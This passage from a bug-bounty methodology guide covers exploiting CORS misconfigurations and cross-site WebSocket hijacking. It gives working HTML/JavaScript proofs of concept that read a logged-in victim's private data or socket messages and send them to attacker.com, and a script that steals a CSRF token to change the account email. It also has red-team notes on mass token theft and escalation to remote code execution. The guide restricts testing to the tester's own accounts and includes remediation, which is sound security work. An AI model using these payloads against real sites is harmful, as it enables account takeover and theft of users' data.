> **If this → then that:** you can make a victim's browser reach an **internal/localhost** service AND it returns `Access-Control-Allow-Private-Network: true` with a permissive `ACAO` → a public web page can **read and drive that intranet service** (router/IoT/dev admin) cross-origin → CSRF-to-internal / internal data theft (High, network-position-dependent). If PNA is *not* granted but you still need internal reach, pivot to **DNS rebinding** (SSRF kit §7.2).

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC here uses **your own test accounts** and **benign reads** — you demonstrate that *evil.com can read account A's data while account A is logged in*, using two accounts you own. Never read a real third party's data (§20).

# 11. Cross-Origin Secret Theft

This is the core exploit: your page on `attacker.com` makes the victim's browser fetch a credentialed response from the target and ships it to you.

> *In plain words:* here's the whole attack in one breath. The victim is logged into `target.com` (so their browser holds valid cookies). You trick them into visiting your page (a link, an ad, a watering-hole). Your page's JavaScript runs `fetch('https://api.target.com/api/me', {credentials:'include'})` — the `credentials:'include'` tells the browser to attach the victim's cookies, so the server replies with the victim's *private* data. Normally SOP would stop your script from *reading* that reply — but the CORS misconfig told the browser it's fine, so your script reads it and forwards it to your server. No XSS on the target needed; the victim just had to open your page while logged in.

```html
<!-- poc/exfil.html — hosted on attacker.com; victim must be logged into target.com -->
<!DOCTYPE html><html><body>
<script>
  fetch('https://api.target.com/api/me', { credentials: 'include' })   // sends victim's cookies
    .then(r => r.text())
    .then(data => {
      // exfil to your server (benign PoC: send to YOUR collector)
      fetch('https://attacker.com/collect?d=' + encodeURIComponent(data));
    });
</script>
</body></html>
```
What proves the bug:
```
1. Log in as TEST USER A (your account) in a normal browser.
2. In the SAME browser, visit attacker.com/exfil.html (simulating the victim clicking your link).
3. attacker.com receives USER A's private response (their email/API key/token) — data evil.com should NEVER read.
4. Screenshot: the request from attacker.com origin + the secret data arriving at your collector.
```
The browser allowed `attacker.com` to **read** the credentialed response *only because* of the CORS misconfig — that's the whole exploit, no XSS on the target required.

> **If this → then that:** the exfiltrated body contains a **session token / API key / password-reset token** → escalate to account takeover (§12). It contains **PII / messages / financial data** → that's a data-breach impact on its own (High). It contains the **anti-CSRF token** → chain a state-changing CSRF (§13).

---

# 12. Account Takeover via CORS

The strongest outcome. If the secret you read cross-origin authenticates the user, you take over the account.

> *In plain words:* reading *any* private data cross-origin is already a good bug — but it jumps to the top tier when the thing you read is something that **logs you in as them**. If `/api/me` hands back a session token, API key, or a password-reset link, you don't just *see* the victim's data — you *become* the victim (replay the token, and the server treats you as them). That's the difference between "High: data exposure" and "Critical: one page-visit = full account takeover." So after any successful read, always ask: *does this leaked value let me authenticate as the victim?*

```
□ API key / session token in the response  → replay it (Authorization: Bearer <token> / set the cookie) → full ATO.
□ CSRF token  → use it to complete a sensitive state change (change email/password) → ATO (§13).
□ "/api/me" returning email + a passwordless magic-link/reset token → trigger + read the reset → ATO.
□ OAuth code/token leaked in a CORS-readable response → exchange it → ATO.
□ GraphQL "viewer { apiToken, email, ... }" in one credentialed read → everything at once.
```
**Proof (own accounts):** read User A's token via the exfil PoC, then show it authenticates as User A (e.g., call `/api/me` with it and get A's identity back) — *using only your own two accounts*. That's a complete ATO PoC.

> **If this → then that:** the CORS-readable response yields anything that **authenticates** the user (token/key/reset link) → you have **cross-origin Account Takeover**. This is the top CORS outcome: a single visit to your page = full takeover of any logged-in victim. Critical/High depending on user interaction & scope.

---

# 13. CORS + State Change (cross-origin write / CSRF amplification)

CORS isn't only read. Two write angles:

## 13.1 Steal the anti-CSRF token, then CSRF
If a page is CSRF-protected by a token that lives in a CORS-readable endpoint (`/api/csrf`, or embedded in `/api/me`), use the credentialed read to **steal the victim's CSRF token**, then submit a forged state-changing request *with* that token — defeating the CSRF defense entirely.
```js
fetch('https://target.com/api/csrf',{credentials:'include'}).then(r=>r.json()).then(t=>{
  fetch('https://target.com/api/email',{method:'POST',credentials:'include',
    headers:{'Content-Type':'application/json','X-CSRF-Token':t.token},
    body:JSON.stringify({email:'attacker@evil.com'})});   // change email → ATO (own account in PoC)
});
```

## 13.2 Direct cross-origin write
If the misconfig also allows credentialed `POST`/`PUT` reads of the response (pre-flight permissive, §10.2), an attacker page can perform **authenticated writes** and read the result — full CSRF with response reading.

> **If this → then that:** the app *was* CSRF-safe (token-based) but the token is **CORS-readable** → you've broken the CSRF defense; chain to email/password change = **ATO**. Cross-reference the **CSRF kit** for the state-change exploitation half.

## 13.3 Cross-Site WebSocket Hijacking (CSWSH) — the CORS-adjacent class
**WebSockets do NOT honor the Same-Origin Policy or CORS.** A `ws://`/`wss://` handshake is a normal HTTP `Upgrade` request that **carries the victim's cookies** and is **not** gated by ACAO. If the server authenticates the WS purely by cookie and **doesn't validate the `Origin` header on the handshake**, an attacker page can open a **cross-origin, fully-authenticated WebSocket** to the target → read everything the victim's socket receives and send messages as them.

> *In plain words:* WebSockets (the live two-way connection behind chat/notifications, `wss://…`) have a nasty gap: **the browser does *not* apply CORS to them.** When your page opens `new WebSocket('wss://target.com/chat')`, the browser still attaches the victim's cookies, and there's no ACAO check to stop you *reading* the messages. The server's *only* defense is to check the `Origin` header on the connection handshake itself — and many apps that carefully locked down CORS forget to do this on their socket. If it doesn't check, you get a fully logged-in connection to the victim's chat/feed from your evil page. This is "CSWSH" — think of it as "CORS theft, but over a WebSocket the developer forgot to guard" (CWE-1385).
```html
<!-- attacker page; victim is logged into target.com -->
<script>
  const ws = new WebSocket('wss://target.com/chat');           // browser sends the victim's cookies, NO CORS check
  ws.onopen = () => ws.send('{"action":"getMessages"}');        // act as the victim
  ws.onmessage = e => navigator.sendBeacon('https://attacker.com/exfil', e.data);  // read victim data
</script>
```
Test: replay the WS handshake with `Origin: https://evil.com` (Burp Repeater WS / a script). If the upgrade succeeds and the socket works **authenticated**, it's CSWSH.
> **If this → then that:** a WebSocket is authed by cookie and the handshake **ignores `Origin`** → **Cross-Site WebSocket Hijacking**: any attacker page reads/sends on the victim's authenticated socket → data theft + actions (often **High–Critical**, like a CORS credentialed read but over WS). The fix is the same idea as CORS: **validate `Origin` on the handshake** + use a per-connection CSRF token. Many "CORS-safe" apps forget the WS endpoint entirely.

---

# 14. Chaining CORS

CORS is a force-multiplier. The best reports are chains:
```
□ Subdomain takeover → host exfil page on *.target.com → satisfies "*.target.com" allowlist → credentialed theft (§9).
□ XSS on a trusted subdomain → run the credentialed fetch from a trusted origin → read api.target.com secrets.
□ CORS read of an API key → use the API key against other endpoints (privilege/scope escalation).
□ CORS read of a JWT → take it to the JWT kit (alg/kid/jku tricks) for further escalation.
□ CORS + open redirect (target's own domain) → become a "trusted" origin via redirect-sourced null origin.
□ Internal CORS (*) + SSRF → reach an internal *-CORS service and read it (rare but high).
□ CORS-leaked secret → feeds the next kit (FileUpload signed-URL, SSRF cloud creds, etc.).
```

## 14.1 CORS → RCE / shell (the chains that reach a shell) ⭐ CRITICAL
CORS doesn't execute code by itself — but the **secret it leaks** very often does. This is the highest-impact CORS outcome; chase it whenever the readable body holds infra/cloud/admin material:
```
□ Leaked CLOUD credentials (AWS/GCP/Azure key, session token) in a CORS-readable response
     → assume the role → reach a compute/SSM/Cloud-Function "run command" surface → REMOTE SHELL on cloud infra.
       (Validate live read-only — `aws sts get-caller-identity` — then stop; see SSRF kit §11/§23.)  → CRITICAL
□ Leaked ADMIN API key / admin session via CORS
     → an admin-only feature that runs code/imports plugins/edits templates/uploads files → web shell → RCE. → CRITICAL
□ Leaked SOURCE-CONTROL / CI token (GitHub/GitLab/Jenkins) via CORS
     → push a malicious pipeline/commit/Action → code execution on build agents → supply-chain RCE. → CRITICAL
□ Leaked secret that unlocks a CODE-EXEC feature elsewhere (SSTI template editor, file-upload web-shell, deploy hook)
     → pivot into the matching kit (SSTI / FileUpload / Command-Injection) and finish to a shell. → CRITICAL
□ Leaked API key with write scope → poison a config/template the server later renders → RCE (SSTI) or shell (upload).
```
> **The CORS→RCE rule:** *a CORS read is "only" data theft until you read a secret that grants code execution.* Always ask "**does this leaked value let me run a command anywhere?**" — a leaked cloud key (→ cloud shell), admin key (→ admin code-exec feature), or CI token (→ pipeline RCE) turns a High data-theft CORS bug into a **Critical RCE chain**. Demonstrate the shell **only on your own test tenant/account**, read-only-validate live creds, and stop (§20).

> **If this → then that:** CORS only trusts `*.target.com` and Recon flagged a **dangling subdomain** → the takeover *is* the missing piece; claim it and the CORS bug becomes exploitable. Always look one hop out: a "medium" reflection on a restricted allowlist becomes "critical" the moment you control a trusted origin — and **critical-RCE** the moment the leaked secret runs code (§14.1).

---

# 15. Internal / Pre-prod / Non-Credentialed Sensitive Data

Not every CORS win needs credentials. If an endpoint returns **sensitive data to anyone** *and* sets `ACAO:*` (or reflects), any website can read it from a victim's browser (handy when the data is gated by **network position** / intranet):
```
□ Internal/admin/metrics/debug endpoints with ACAO:* returning config, tokens, user lists, infra detail.
□ Pre-prod/staging APIs mirroring prod data, ACAO:* , weak/no auth.
□ Endpoints that return data based on the *victim's IP / intranet position* — a drive-by lets an external attacker
   read internal-only data via a victim inside the network (CORS-assisted internal recon).
□ Token-in-URL or session-in-body endpoints readable cross-origin without ACAC (because auth isn't cookie-based).
```

> **If this → then that:** `ACAO:*` on an endpoint that returns sensitive data **without** requiring the victim's credentials → it's still cross-origin data theft (Medium–High by data sensitivity), even though `*` can't carry cookies. Judge by **what the body exposes**, not by the header alone.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 16. The Validity-First Mindset

## 16.1 The four questions a triager asks (answer them in your report)
1. **Is an attacker-controlled origin trusted?** Show `Origin: https://evil.com` (or `null`, or your bypass origin) reflected into `Access-Control-Allow-Origin`.
2. **Are credentials allowed?** Show `Access-Control-Allow-Credentials: true` — or, for non-credentialed, prove the data is sensitive and needs no auth (§15).
3. **What secret does it expose?** The actual body — token/API key/PII/CSRF token — read **cross-origin**. Name the secret.
4. **What's the impact of that secret?** ATO (token/key), data breach (PII), CSRF chain (token). Demonstrate with your own accounts.

## 16.2 The "reflection vs read" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| `ACAO` reflects evil.com, **no** `ACAC` | Low/Info | …the body is sensitive *and* served without auth (§15), else Info. |
| `ACAO: *`, no creds | Info | …a sensitive, no-auth endpoint returns real data (§15). |
| Reflection **+ `ACAC:true`**, body has **no** secret | Low | …you find a sibling endpoint with the same policy that *does* return secrets (§3). |
| Reflection + `ACAC:true` + **secret body** | **High** | …the secret is a token/key → **ATO** (§12) → push to Critical. |
| `null` + `ACAC:true` + secret body | **High** | …same; trivially exploitable from any site via sandboxed iframe. |
| `*.target.com` trust only | Medium (potential) | …you actually control a subdomain (takeover/XSS) → then High (§9). |

## 16.3 Production-scope discipline
Confirm on the **real, authenticated** endpoint with a **working cross-origin read** in a real browser. A reflected header you only proved with curl (no body, no credentials in a browser) is weaker evidence — back it with the `fetch()` PoC reading a second test account's data. Re-test after partial fixes: blocking `evil.com` but still allowing `null`, or still reflecting `target.com.evil.com`, is a fresh valid finding.

---

# 17. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **`Access-Control-Allow-Origin: *`** on a public, unauthenticated endpoint | `*` can't carry credentials; public data is public. | The endpoint returns **sensitive** data with **no auth** needed (§15). |
| 2 | **Reflected origin, no `ACAC: true`** | Browser won't send the victim's cookies → you read your own/unauth data only. | The data is sensitive & auth-less (§15), or another endpoint adds creds. |
| 3 | **Reflected + `ACAC:true` but body has NO secret** (a public/empty/marketing JSON) | Nothing to steal. | A sibling endpoint with the same policy returns secrets (§3/§11). |
| 4 | **`ACAO:*` AND `ACAC:true` together** | Browsers refuse this pair → not exploitable for creds. | Essentially not exploitable; note as hardening at most. |
| 5 | **Static correct ACAO** (`https://app.target.com`, the real frontend) | Intended; your origin isn't trusted. | You control that origin (subdomain takeover/XSS, §9). |
| 6 | **"CORS allows my origin" proven only by curl** (no browser read, no creds) | curl ignores SOP — it's not proof of a browser-exploitable read. | Demonstrate the actual cross-origin `fetch()` read in a browser (§11/§20). |
| 7 | **Self-XSS-style: you set Origin to the app's own origin** | The app trusting itself is normal. | An *attacker* origin/`null`/bypass origin is trusted. |
| 8 | **Pre-flight `OPTIONS` reflects origin, but the actual GET/POST doesn't / has no creds** | Pre-flight alone doesn't grant the read. | The real response also reflects + `ACAC:true` + secret. |
| 9 | **Third-party/CDN endpoint** (not the target's asset) | Out of scope / not the target's bug. | It's an in-scope asset of the target. |
| 10 | **Trusting `http://localhost` / `127.0.0.1`** | Usually only exploitable by local malware, low remote impact. | Combined with a real attack path; otherwise low. |

> Rule of thumb: if you can't say *"my attacker origin (or `null`) is trusted **with credentials**, and from it I read `<a real secret>` belonging to another logged-in user,"* you have a **CORS condition, not a CORS exploit** — usually Low/Info. Keep escalating (find a credentialed secret-bearing endpoint, prove the browser read) before reporting.

---

# 18. Severity Calibration — how triagers really rate CORS

| Scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **Reflection/null + `ACAC:true` → read session token/API key → ATO** | **High** | **Critical** | One click = full account takeover; low precondition. |
| **Reflection/null + `ACAC:true` → read PII/messages/financial** | **High** | High | Mass data theft of any logged-in user. |
| **Reflection/null + `ACAC:true` → steal CSRF token → email/pw change** | **High** | Critical | CSRF defense broken → ATO. |
| **`*.target.com` trust + a subdomain you control (takeover/XSS)** | **Medium→High** | High–Critical | Realized once you control a trusted origin (§9). |
| **`ACAO:*` on sensitive, no-auth internal/pre-prod data** | **Medium** | High | Sensitivity of the exposed data. |
| **Reflection + `ACAC:true` but body has no real secret** | **Low** | — | Up only if a sibling endpoint leaks secrets. |
| **`ACAO:*` on public/non-sensitive data** | **Info** | — | Not a vuln by itself. |

**CVSS / CWE:**
- Credentialed cross-origin secret theft → ATO: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` → **High–Critical** (UI:R because the victim must visit your page; some programs drop it for the low bar). **CWE-942** (Permissive Cross-domain Policy) / **CWE-346** (Origin Validation Error).
- Data-theft only (no integrity): `C:H/I:N` → High.
- Anchor to **CWE-942 / CWE-346**; add the outcome CWE (CWE-200 info exposure, CWE-384 session, CWE-352 if you chain CSRF).

---

# 19. Impact-Escalation Playbooks — "you found X, now do Y"

### 19.1 You found: *ACAO reflects any origin, `ACAC:true`*
- **Escalate:** find an endpoint whose **authenticated** response holds a secret (`/api/me`, `/api/keys`, `/graphql`) (§3). Build `poc/exfil.html` with your origin; read a **second test account's** data (§11).
- **Evidence:** the secret body arriving at your collector, from your attacker origin, in a browser.
- **Severity:** High → Critical if the secret = token/key (§12).

### 19.2 You found: *`Origin: null` is allowed with credentials*
- **Escalate:** exploit via a **sandboxed iframe** (origin `null`) running the credentialed fetch (§7). Same exfil path.
- **Evidence:** the iframe (origin `null`) reading and shipping the secret.
- **Severity:** High (trivially exploitable from any site).

### 19.3 You found: *an allowlist you can't satisfy from evil.com (`*.target.com`)*
- **Escalate:** get a **trusted origin** — subdomain takeover of a dangling sub, or XSS on a trusted subdomain (§9). Host the exfil there.
- **Evidence:** the credentialed read executed *from* the trusted subdomain origin.
- **Severity:** the takeover/XSS + CORS chain → High–Critical.

### 19.4 You found: *a credentialed secret body (token/key) read cross-origin*
- **Escalate:** prove the token authenticates the victim (call `/api/me` with it → victim identity) → **ATO** (§12). If it's a JWT/API key, take it to the JWT kit / scope-escalation.
- **Evidence:** the stolen token authenticating as the victim (own accounts).
- **Severity:** **Critical/High** (full ATO).

### 19.5 You found: *a CORS-readable CSRF token on an otherwise CSRF-safe app*
- **Escalate:** steal the token, submit the protected state change (email/password) → ATO (§13). Cross-ref **CSRF kit**.
- **Evidence:** the state change completing with the stolen token, cross-origin.
- **Severity:** High–Critical.

### 19.6 You found: *only `ACAO:*` (no creds)*
- **Escalate:** check for **sensitive, no-auth** data on that or sibling endpoints (internal/pre-prod) (§15). If none, it's **Info** — don't report a bare `*`.
- **Evidence:** sensitive data read cross-origin without auth.
- **Severity:** Medium–High by data sensitivity, or Info.

---

# 20. Building a Professional, Safe PoC

A great CORS PoC is **a real browser reading a real secret cross-origin — using accounts you own.**
```
DO:
  □ Use TWO of your OWN test accounts (or one account + an unauth view). Demonstrate that attacker.com reads
    account A's secret while A is logged in — never a real third party's data.
  □ Host the exfil page on a domain/origin YOU control (attacker.com / ngrok / pages). Show the request's Origin.
  □ Exfil to YOUR OWN collector (webhook.site / your server). Redact the secret value in the public report
    (show enough to prove it's the victim's token/PII, mask the rest).
  □ Capture: the request (with Origin) + the vulnerable response headers (ACAO/ACAC) + the secret arriving at your
    collector + (for ATO) the token authenticating as the victim.
  □ Provide the exact bypass origin/null technique and a minimal, non-weaponized HTML PoC.
DON'T:
  □ Read or store any real user's data. Use your own accounts only.
  □ Mass-harvest tokens, run the PoC against real victims, or leave the exfil page live/indexed.
  □ Paste a full live secret into the report — redact. 
  □ Over-claim: if there's no ACAC and the data isn't sensitive, don't call it Critical.
```
> The single most important restraint: **prove the read with your own two accounts and a benign collector, then stop.** You don't need anyone else's data to demonstrate "evil.com can read a logged-in user's secret." Same discipline as the SSRF guide's `get-caller-identity` and the FileUpload guide's benign markers.

**Remediation to include:** use a **strict allowlist of exact origins** (no reflection, no `startsWith`/`contains`/regex shortcuts); never reflect arbitrary `Origin`; never allow `null` with credentials; don't combine `*` with credentials; serve secret data only over **non-CORS** paths or require a non-cookie auth + per-request token; set `Access-Control-Allow-Credentials` only on the few endpoints that truly need it; validate the **full** origin (scheme + host + port), escaping dots in any regex and anchoring it.

---

# 21. Reporting, CWE/CVSS & De-duplication

Use `CORS_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "CORS misconfiguration (origin reflection + credentials) on /api/me → cross-origin account takeover" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-942/CWE-346 (+ outcome CWE)
3. Asset        exact endpoint + the trusted-origin technique (reflect/null/bypass) + whether ACAC:true
4. Summary      which origin is wrongly trusted, that credentials are allowed, and what secret the body returns
5. Steps        numbered: the request w/ Origin → the vulnerable response headers → the browser fetch() reading the secret
6. PoC          the exact bypass origin + the exfil HTML + the secret arriving at your collector (own accounts, redacted)
7. Impact       ATO / data breach / CSRF chain — the "so what" with the stolen secret
8. Remediation  strict exact-origin allowlist, no reflection, no null+creds, no *+creds (§20)
```
**De-dup:** one CORS policy/root cause = one finding even if many endpoints share it; lead with the highest-impact endpoint (the one returning the most sensitive secret). Don't split "origin reflected" and "token stolen" — they're one report. If multiple distinct policies exist (e.g., a separate vulnerable `null` allowance on another service), those can be separate.

---

# 22. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
# Add Origin: https://evil.com to every request (Burp Match-and-Replace), then grep history for reflected ACAO.
python3 poc/cors_scan.py -l live_urls.txt -o cors_hits.txt      # reflection/null/suffix/prefix/wildcard probes
python3 Corsy/corsy.py -i live_urls.txt -t 20                    # known CORS misconfig classes
python3 CORScanner/cors_scan.py -i live_urls.txt                 # alt scanner
nuclei -l live.txt -tags cors -o cors.txt
```
- **Quality gate:** a scanner flag is a *candidate*. Confirm (a) an **attacker-controlled** origin (or `null`) is trusted, (b) **`ACAC:true`**, (c) a **real secret** in the body, and (d) a working **browser** `fetch()` read with your own accounts. Only then is it reportable.

**Red-team angles:**
```
□ CORS → token/API-key theft → lateral movement with the victim's credentials.
□ Subdomain takeover → satisfy *.target.com allowlist → mass credentialed theft of any logged-in user.
□ Phish-free ATO: a single watering-hole/ad link to your exfil page silently dumps tokens of logged-in visitors.
□ CORS-leaked internal endpoints + an internal victim → read intranet-only data via the victim's browser (CORS recon).
□ Chain: CORS read CSRF token → CSRF email/pw change → persistent ATO.
□ Combine with the JWT kit (stolen JWT) / SSRF kit (internal *-CORS) / FileUpload kit (signed-URL leakage).
```

---

# Appendix A — CORS Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                        CORS WORKFLOW                              │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: find endpoints returning ACAO — esp. AUTHENTICATED,      │
│    SECRET-bearing (/api/me, /keys, /graphql, token endpoints) §3   │
│ 1. BASELINE ★ : send Origin: evil.com →                            │
│    • ACAO reflects it?  • ACAC: true?  • body has a secret? §4      │
│ 2. ACAO LOGIC: reflect-any / null / allowlist / wildcard §5        │
│ 3. BYPASS (get YOUR origin trusted + creds):                       │
│    reflect §6 · null (sandboxed iframe) §7 · suffix/prefix/regex §8 │
│    · trusted-subdomain (takeover/XSS) §9                            │
│ 4. IMPACT ⭐ (route by secret):                                     │
│    read victim secret cross-origin (fetch+credentials) ... §11 ⭐⭐  │
│    token/key → ACCOUNT TAKEOVER ...................... §12 ⭐⭐⭐    │
│    steal CSRF token → email/pw change → ATO .......... §13 ⭐        │
│    subdomain takeover/XSS → satisfy *.target.com ..... §9/§14       │
│    *+sensitive no-auth data .......................... §15          │
│ 5. VALIDATE → REPORT:                                              │
│    false-positive filter §17 · CVSS+CWE-942/346 §18               │
│    SAFE PoC: own 2 accounts, benign collector, redact §20         │
│    title = IMPACT (ATO/data theft), dedup §21                     │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — CORS Attack Decision Tree

```
Sent Origin: https://evil.com to the endpoint (§4) →
│
├─ No Access-Control-Allow-Origin returned? → SOP enforced, no CORS bug. Test other endpoints.
│
├─ ACAO == https://evil.com (reflected)?
│     ├─ ACAC: true?  ── YES → does the body have a secret (token/key/PII/CSRF)?
│     │                         ├─ YES → CROSS-ORIGIN THEFT (§11) → token? → ATO (§12). HIGH/CRITICAL ⭐
│     │                         └─ NO  → find a sibling secret-bearing endpoint (§3). Else Low.
│     │                  └─ NO  → non-credentialed: is the data sensitive & auth-less? → §15 else Info.
│     │
├─ ACAO == null (after sending Origin: null)? + ACAC:true → sandboxed-iframe exploit (§7) → as above. HIGH ⭐
│
├─ ACAO == * ?
│     ├─ + ACAC:true → browser won't honor for creds → essentially not exploitable (note as hardening).
│     └─ no creds → sensitive no-auth data? → §15 (Medium–High) else Info.
│
├─ ACAO static/trusted only? → try to get YOUR origin trusted:
│     ├─ "contains/endsWith/startsWith/regex" weakness? → bypass origin §8.
│     └─ only *.target.com? → subdomain takeover / XSS on a sub (§9) → then exfil (§11).
│
└─ Curl shows reflection but no browser read / no creds? → NOT proven exploitable. Build the fetch() PoC (§11/§20).

ALWAYS: prove the cross-origin READ in a real browser with your OWN accounts, name the secret, then report (§20).
```

---

# Appendix C — Important Links & References

**Primary (read these first)**
- PortSwigger Web Security Academy — *Cross-origin resource sharing (CORS)* (theory + labs): https://portswigger.net/web-security/cors
- PortSwigger Web Security Academy — *Cross-site WebSocket hijacking*: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- OWASP — *CORS OriginHeaderScrutiny*: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- OWASP WSTG — *Testing Cross Origin Resource Sharing*: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
- MDN — *Cross-Origin Resource Sharing (CORS)*: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

**Payloads, techniques & cheat sheets**
- PayloadsAllTheThings — *CORS Misconfiguration*: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- HackTricks — *CORS bypass*: https://book.hacktricks.xyz/pentesting-web/cors-bypass
- OWASP HTML5 Security Cheat Sheet (CORS section): https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- PentesterLab — CORS exercises/badges: https://pentesterlab.com/

**Authoritative specs (the ground truth for origin/validation logic)**
- WHATWG — *Fetch Standard*, §HTTP CORS protocol (how the browser really decides ACAO/ACAC): https://fetch.spec.whatwg.org/#http-cors-protocol
- RFC 6454 — *The Web Origin Concept* (what "origin" is: scheme+host+port): https://www.rfc-editor.org/rfc/rfc6454
- W3C/WICG — *Private Network Access* (PNA — the §10.5 public→private control): https://wicg.github.io/private-network-access/

**Research & talks (the source of the advanced techniques)**
- James Kettle / PortSwigger Research — *Practical Web Cache Poisoning* (reflected-ACAO + `Vary` cache angles, §10.4): https://portswigger.net/research/practical-web-cache-poisoning
- PortSwigger Research index (CORS, cache poisoning, smuggling): https://portswigger.net/research
- Christian Schneider — *Cross-Site WebSocket Hijacking* (the canonical CSWSH writeup, §13.3): http://www.christian-schneider.net/CrossSiteWebSocketHijacking.html
- Jordan Milne / Evan Johnson — CORS origin-reflection misconfiguration research
- Black Hat / DEF CON — web-cache-poisoning & WebSocket-security talks (Kettle et al.)

**Real-world / bug-bounty writeups**
- Disclosed HackerOne / Bugcrowd reports — search *"CORS misconfiguration → account takeover"* / *"sensitive data exposure via CORS"*
- James Kettle cache-poisoning disclosures (reflected ACAO served from a shared cache)

**Tooling**
- Corsy: https://github.com/s0md3v/Corsy
- CORScanner: https://github.com/chenjj/CORScanner
- Nuclei — cors templates (`-tags cors`): https://github.com/projectdiscovery/nuclei-templates
- Burp *Param Miner* — unkeyed-header / cache-poisoning detection: https://github.com/PortSwigger/param-miner

**CWE / standards to cite**
- CWE-942 — Permissive Cross-domain Policy with Untrusted Domain: https://cwe.mitre.org/data/definitions/942.html
- CWE-346 — Origin Validation Error: https://cwe.mitre.org/data/definitions/346.html
- CWE-1385 — Missing Origin Validation in WebSockets (CSWSH): https://cwe.mitre.org/data/definitions/1385.html
- Outcome CWEs to add per impact: CWE-200 (information exposure), CWE-384 (session hijacking), CWE-352 (CSRF chain)

---

> **Final reminder — the one rule that pays:** *A CORS bug is only a finding when an attacker-controlled origin (or `null`) is trusted **with credentials**, and from it you read a **real secret** belonging to another logged-in user — ideally one that grants account takeover.* A reflected header with no credentials, no secret, or only `*` on public data is **Informational**. Confirm reflection, prove the credentialed browser read with your own accounts, climb to a token/key for ATO, and report the impact — not the header. That's how `Access-Control-Allow-Origin: https://evil.com` becomes the Critical it's worth.
